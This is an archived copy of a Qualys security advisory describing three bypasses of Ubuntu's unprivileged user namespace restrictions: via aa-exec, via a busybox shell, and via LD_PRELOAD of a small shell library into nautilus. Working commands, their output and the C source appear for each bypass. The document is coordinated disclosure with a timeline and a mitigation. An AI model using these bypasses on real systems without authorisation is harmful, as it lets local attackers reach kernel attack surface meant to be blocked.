---
url: "https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt"
captured: "2026-11-02T19:00:55Z"
via: "live"
sha256: "49d9e3433b1f9ae8d709fb658fc0f5eda2cb290f86c5167fcd28d100103f8f1a"
wayback: "https://web.archive.org/web/20260902165306/https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt"
cited_in:
  - "docs/threats/08-desktop-and-sandboxing.md"
---

# https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt>
> Snapshot: <https://web.archive.org/web/20260902165306/https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt>


Qualys Security Advisory

Three bypasses of Ubuntu's unprivileged user namespace restrictions


========================================================================
Contents
========================================================================

Summary
Bypass via aa-exec
Bypass via busybox
Bypass via LD_PRELOAD
Acknowledgments
Timeline (advisory sent to the Ubuntu Security Team on January 15, 2025)


------------------------------------------------------------------------
  Prologue, from https://grsecurity.net/10_years_of_linux_security.pdf:

    + February 2013 (v3.8) - Unprivileged User Namespace support added
      - Greatly increased kernel attack surface, exposed many interfaces
        that previously saw little security scrutiny

    + Attack surface exposed by unprivileged user namespaces isn't
      decreasing anytime soon
      - Even more functionality being exposed
------------------------------------------------------------------------


========================================================================
Summary
========================================================================

Ubuntu 23.10 introduced unprivileged user namespace restrictions (the
sysctl kernel.apparmor_restrict_unprivileged_userns) and Ubuntu 24.04
enabled them by default. From Alex Murray's excellent blog post at
https://ubuntu.com/blog/whats-new-in-security-for-ubuntu-24-04-lts:

  "Unprivileged user namespaces are a widely used feature of the Linux
  kernel, providing additional security isolation for applications, and
  are often employed as part of a sandbox environment. However, [...]
  unprivileged user namespaces also expose additional attack surfaces
  within the Linux kernel. There has been a long history of (ab)use of
  unprivileged user namespaces to exploit various kernel
  vulnerabilities.

  For Ubuntu 24.04 LTS, the use of unprivileged user namespaces is then
  allowed for all applications but access to any additional permissions
  within the namespace are denied. This allows more applications to more
  gracefully handle this default restriction whilst still protecting
  against the abuse of user namespaces to gain access to additional
  attack surfaces within the Linux kernel."

Unfortunately, we discovered three different bypasses of these
unprivileged user namespace restrictions; each bypass allows a local
attacker to create user namespaces with full administrator capabilities,
and therefore to still exploit vulnerabilities in kernel components that
require capabilities such as CAP_SYS_ADMIN or CAP_NET_ADMIN:

- An unprivileged local attacker can simply use the aa-exec tool (which
  is installed by default on Ubuntu) to transition to one of the many
  pre-configured AppArmor profiles that do allow the creation of user
  namespaces with full capabilities (for example, the chrome, flatpak,
  or trinity profile).

- An unprivileged local attacker can first execute a busybox shell,
  which is installed by default on Ubuntu, and is one of the programs
  whose pre-configured AppArmor profile does allow the creation of user
  namespaces with full capabilities.

- An unprivileged local attacker can LD_PRELOAD a shell into one of the
  programs whose pre-configured AppArmor profile does allow the creation
  of user namespaces with full capabilities (for example, nautilus is
  installed by default on Ubuntu Desktop).

Clarification: such a bypass allows an unprivileged user to obtain full
capabilities *inside* a namespace, not on the host outside a namespace;
for comparison, a bypass is not even needed on most Linux distributions,
because they allow unprivileged users to obtain full capabilities inside
namespaces by default (and therefore to exploit CAP_SYS_ADMIN kernel
vulnerabilities for example), without any restriction at all.

For more information on these bypasses and user namespace restrictions,
please refer to Ubuntu's post at:

  https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction


========================================================================
Bypass via aa-exec
========================================================================

    Are we all just algorithms doing what we're supposed to do or can we
    escape our programming?
        -- Jude, The Matrix Resurrections

While working on needrestart, particularly on commit e17b564 ("core: fix
regression of false positives for processes running in chroot or mountns
(#317)"), we tried to experiment with user and mount namespaces, but to
our great surprise we were barred from creating them as an unprivileged
user on Ubuntu 24.04 (although kernel.unprivileged_userns_clone is
enabled by default):

------------------------------------------------------------------------
$ id
uid=1001(tiffany) gid=1001(tiffany) groups=1001(tiffany),100(users)

$ unshare -U -r -m /bin/sh
unshare: write failed /proc/self/uid_map: Operation not permitted
------------------------------------------------------------------------

This error message looked very suspicious to us, so we decided to try
the userns_child_exec tool (from man user_namespaces) instead of the
pre-installed unshare tool:

------------------------------------------------------------------------
$ ./userns_child_exec -U -z -m /bin/sh

# id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)

# mount --bind /etc/passwd /etc/passwd
mount: /etc/passwd: bind /etc/passwd failed.
       dmesg(1) may have more information after failed mount system call.
------------------------------------------------------------------------

This time we were able to create a user and mount namespace, but to our
growing surprise we were barred from using any administrator capability
inside this namespace (our mount command failed). Puzzled, we eventually
found out that these restrictions were introduced in Ubuntu 23.10, and
enabled by default in Ubuntu 24.04, to prevent unprivileged local
attackers from exploiting kernel vulnerabilities that require
capabilities (CAP_SYS_ADMIN, CAP_NET_ADMIN, etc):

  https://discourse.ubuntu.com/t/spec-unprivileged-user-namespace-restrictions-via-apparmor-in-ubuntu-23-10

To bypass these restrictions, we immediately tried to run unshare
through aa-exec, to transition to one of Ubuntu's many AppArmor profiles
that do allow the creation of user namespaces with full capabilities;
for example, the trinity profile:

------------------------------------------------------------------------
$ grep userns /etc/apparmor.d/trinity
  userns,

$ aa-exec -p trinity -- unshare -U -r -m /bin/sh

# mount --bind /etc/passwd /etc/passwd

# mount
...
/dev/sda2 on /etc/passwd type ext4 (rw,relatime)
------------------------------------------------------------------------

At last, we were able to create a user namespace with full capabilities
(our mount command succeeded). We later noticed that a quick fix to this
particular bypass was already mentioned on Ubuntu's excellent security
podcast in October 2023, but unfortunately it was never enabled by
default; from https://ubuntusecuritypodcast.org/episode-211/:

  "From a defensive security point of view, also is useful to enable an
  additional sysctl to ensure that anything which is unconfined can't
  just abuse these profiles by aa-exec'ing themselves via that profile -
  so then also need to enable the
  kernel.apparmor_restrict_unprivileged_unconfined = 1 sysctl too"


========================================================================
Bypass via busybox
========================================================================

    I'm living inside a computer-generated reality that has imprisoned
    me... again.
        -- Thomas, The Matrix Resurrections

Let us now suppose that our bypass via aa-exec is fixed (i.e.,
kernel.apparmor_restrict_unprivileged_unconfined is enabled): can we
find another way to bypass Ubuntu's unprivileged user namespace
restrictions?

The only program that is installed by default on both Ubuntu Server and
Ubuntu Desktop, and whose pre-configured AppArmor profile does allow the
creation of user namespaces with full capabilities, is busybox.

We therefore simply tried to execute unshare through busybox's built-in
shell, and lo and behold, we were again able to create a user namespace
with full capabilities (our mount command succeeded):

------------------------------------------------------------------------
$ grep userns /etc/apparmor.d/busybox
  userns,

$ busybox sh

~ $ /usr/bin/unshare -U -r -m /bin/sh

# mount --bind /etc/passwd /etc/passwd

# mount
...
/dev/sda2 on /etc/passwd type ext4 (rw,relatime)
------------------------------------------------------------------------


========================================================================
Bypass via LD_PRELOAD
========================================================================

    You're going to imprison me after I just got free?
        -- Neo, The Matrix Resurrections

Let us now suppose that our bypasses via aa-exec and busybox are both
fixed: can we find another way to bypass Ubuntu's unprivileged user
namespace restrictions?

Besides busybox, the only other program that is installed by default on
Ubuntu Desktop, and whose pre-configured AppArmor profile does allow the
creation of user namespaces with full capabilities, is nautilus.

Although nautilus may or may not provide a shell functionality like
busybox, we can actually take a more general approach: we can simply
LD_PRELOAD a small library into nautilus, which then executes a shell.
And again, we are able to create a user namespace with full capabilities
(our mount command succeeds):

------------------------------------------------------------------------
$ grep userns /etc/apparmor.d/nautilus
  userns,

$ cat > shell.c << "EOF"
#include <unistd.h>
static void __attribute__ ((constructor)) _init (void) {
    static char * const argv[] = { "/bin/sh", NULL };
    static char * const envp[] = { NULL };
    execve(*argv, argv, envp);
    _exit(__LINE__);
}
EOF

$ gcc -fpic -shared -o shell.so shell.c

$ LD_PRELOAD=./shell.so /usr/bin/nautilus

$ unshare -U -r -m /bin/sh

# mount --bind /etc/passwd /etc/passwd

# mount
...
/dev/sda2 on /etc/passwd type ext4 (rw,relatime)
------------------------------------------------------------------------


========================================================================
Acknowledgments
========================================================================

We thank the Ubuntu Security Team for their work on this coordinated
release.


========================================================================
Timeline
========================================================================

2025-01-15: We sent our advisory to the Ubuntu Security Team.

2025-03-21: We noticed that @roddux (on X/Twitter) independently
discovered and published the busybox bypass.

2025-03-27: Coordinated release.

